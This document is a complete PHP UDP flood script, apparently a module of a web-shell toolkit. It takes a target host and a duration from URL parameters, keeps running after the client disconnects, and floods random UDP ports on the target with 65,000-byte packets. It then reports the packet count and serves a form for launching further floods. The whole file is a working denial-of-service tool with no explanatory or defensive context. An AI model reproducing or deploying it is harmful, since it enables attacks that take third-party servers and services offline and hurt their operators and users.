<?php

if(isset($_GET['host'])&&is_numeric($_GET['time'])){
    $pakits = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    
    $exec_time = $_GET['time'];
    
    $time = time();

    $max_time = $time+$exec_time;

    $host = $_GET['host'];
    
    for($i=0;$i<65000;$i++){
            $out .= 'X';
    }
    while(1){
    $pakits++;
            if(time() > $max_time){
                    break;
            }
            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
    }
    echo "<br><b>UDP Flood</b><br>Completed with $pakits (" . round(($pakits*65)/1024, 2) . " MB) packets averaging ". round($pakits/$exec_time, 2) . " packets per second \n";
    echo '<br><br>
        <form action="'.$surl.'" method=GET>
        <input type="hidden" name="x" value="phptools">
        Host: <input type=text name=host value=localhost>
        Length (seconds): <input type=text name=time value=9999>
        <input type=submit value=Go></form>';
}else{ echo '<br><b>UDP Flood</b><br>
            <form action=? method=GET>
            <input type="hidden" name="x" value="phptools">
            Host: <br><input type=text name=host value=localhost><br>
            Length (seconds): <br><input type=text name=time value=9999><br>
            <input type=submit value=Go></form>';
}
?>
